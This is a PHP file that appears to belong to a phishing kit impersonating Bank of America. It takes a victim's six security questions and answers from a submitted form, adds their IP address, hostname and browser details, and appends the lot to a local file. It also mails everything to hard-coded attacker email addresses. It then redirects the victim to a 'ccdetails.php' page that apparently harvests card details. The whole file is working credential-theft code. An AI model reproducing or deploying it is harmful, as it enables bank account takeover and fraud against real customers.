<?php 
$to = "goodgirl3900@yandex.com, benjuli1327@gmail.com"; // Put Your Emails Here
$ip = getenv("REMOTE_ADDR");
$date			=	date("D M d, Y g:i a");
$user_agent     =   $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$message  = "==================  BOA ".$ip."  ==================\n";
$message .= "Question 1 : ".$_POST['question1']."\n";
$message .= "Answer 1 : ".$_POST['answer1']."\n";
$message .= "Question 2 : ".$_POST['question2']."\n";
$message .= "Answer 2 : ".$_POST['answer2']."\n";
$message .= "Question 3 : ".$_POST['question3']."\n";
$message .= "Answer 3 : ".$_POST['answer3']."\n";
$message .= "Question 4 : ".$_POST['question4']."\n";
$message .= "Answer 4 : ".$_POST['answer4']."\n";
$message .= "Question 5 : ".$_POST['question5']."\n";
$message .= "Answer 5 : ".$_POST['answer5']."\n";
$message .= "Question 6 : ".$_POST['question6']."\n";
$message .= "Answer 6 : ".$_POST['answer6']."\n";
$message .= "============= [ Ip & Hostname Info ] =============\n";
$message .= "Client IP : ".$ip."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "Date And Time : ".$date."\n";
$message .= "Browser Details : ".$user_agent."\n";
$message .= "=============+FishFlow+===========\n";
$to = "cash.cow.cash@yandex.com, resultbackup2019@gmail.com";
$subj = " BOA Secret Questions  ||".$ip."\n";
$from = "From: BOA  <bboooaaaa@zillerrr.com>";
$fp = fopen('TTTTXXXXX.txt', 'a');
fwrite($fp, $message);
fclose($fp);
mail($to, $subj, $message, $from);
$praga=rand();
$praga=md5($praga);
Header ("Location: ccdetails.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");
?>